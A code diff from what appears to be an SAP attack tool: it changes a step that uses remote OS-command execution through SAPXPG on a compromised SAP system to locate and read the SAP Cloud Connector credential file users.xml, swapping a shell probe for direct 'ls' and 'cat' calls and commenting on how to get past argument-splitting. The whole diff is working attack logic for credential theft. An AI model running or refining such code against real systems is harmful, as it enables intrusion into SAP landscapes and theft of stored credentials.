@@ -1830,29 +1830,31 @@ def create_app(api: SAPMAPApi) -> Bottle:
             print(f"[*] SCC {host}: Path 1 — trying OS-exec via {n.sid}")
             try:
                 from sapmap_exploit import run_os_command
-                # Probe common SCC install paths; use double-quoted paths
-                # inside, no single quotes needed, so -c "..." is safe.
-                # Avoid ALL inner double-quotes — the SAPXPG -c "..." wrapper
-                # breaks on any " inside the command string.  Use $(...) and
-                # unquoted variable references; paths without spaces are safe.
-                probe_cmd = (
-                    'for d in /opt/sap/scc /usr/local/scc '
-                    '/opt/sapscc /opt/cloud-connector '
-                    '/opt/SAP/cloud-connector; do '
-                    'F=$d/config/users.xml; '
-                    'if [ -f $F ]; then echo USERS_PATH $F; break; fi; done'
-                )
-                r = run_os_command(n, "/bin/sh", f'-c "{probe_cmd}"')
-                out = "\n".join(r.get("output") or [])
-                print(f"[*] SCC {host}: probe output: {out[:200]!r}")
-                m = _re.search(r'USERS_PATH\s+(\S+)', out)
-                if not m:
+                # SAPXPG splits PARAMS on spaces at the OS level — the args
+                # never reach a shell, so /bin/sh -c "..." always breaks.
+                # Call ls and cat directly with a plain path argument.
+                scc_roots = [
+                    "/opt/sap/scc",
+                    "/usr/local/scc",
+                    "/opt/sapscc",
+                    "/opt/cloud-connector",
+                    "/opt/SAP/cloud-connector",
+                ]
+                fpath = None
+                for root in scc_roots:
+                    candidate = f"{root}/config/users.xml"
+                    r_ls = run_os_command(n, "ls", candidate)
+                    ls_out = "\n".join(r_ls.get("output") or [])
+                    print(f"[*] SCC {host}: ls {candidate} → "
+                          f"ok={r_ls.get('success')} out={ls_out[:60]!r}")
+                    if r_ls.get("success") and candidate in ls_out:
+                        fpath = candidate
+                        break
+                if not fpath:
                     print(f"[-] SCC {host}: users.xml not found via "
-                          f"{n.sid} probe (checked 5 paths)")
+                          f"{n.sid} (checked {len(scc_roots)} paths)")
                     continue
-                fpath = m.group(1)
-                r2 = run_os_command(n, "/bin/sh",
-                                    f"-c 'cat {fpath} 2>/dev/null'")
+                r2 = run_os_command(n, "cat", fpath)
                 content = "\n".join(r2.get("output") or [])
                 print(f"[*] SCC {host}: cat output ({len(content)} chars): "
                       f"{content[:80]!r}")
